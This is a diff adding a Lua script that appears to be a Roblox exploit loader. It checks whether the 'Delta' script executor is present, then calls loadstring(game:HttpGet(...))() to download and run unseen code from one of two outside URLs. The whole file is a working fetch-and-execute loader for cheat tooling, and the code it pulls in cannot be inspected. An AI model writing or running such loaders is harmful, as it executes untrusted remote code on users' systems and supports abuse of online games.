@@ -1,0 +1,35 @@
+local function isDeltaExecutor()
+    -- Check via identifyexecutor() / getexecutorname()
+    if identifyexecutor then
+        local name, version = identifyexecutor()
+        if type(name) == "string" and name:lower():find("delta") then
+            return true
+        end
+    end
+    
+    if getexecutorname then
+        local name = getexecutorname()
+        if type(name) == "string" and name:lower():find("delta") then
+            return true
+        end
+    end
+
+    -- Check for Delta-specific globals or flags
+    if DELTA_LOADED ~= nil or getgenv().DELTA_LOADED ~= nil then
+        return true
+    end
+
+    return false
+end
+
+-- ==========================================
+--  EXECUTION BRANCHING
+-- ==========================================
+
+if isDeltaExecutor() then
+    print'delta'
+    loadstring(game:HttpGet("https://vss.pandauth.com/kv/fe63c15f40ddcfe2"))()
+else
+    print'pc others'
+    loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/eb70e01a85a92c98ca0e54a9bb5a2474cef55eef9f2d0aa76aa086e6217f7453/download"))()
+end
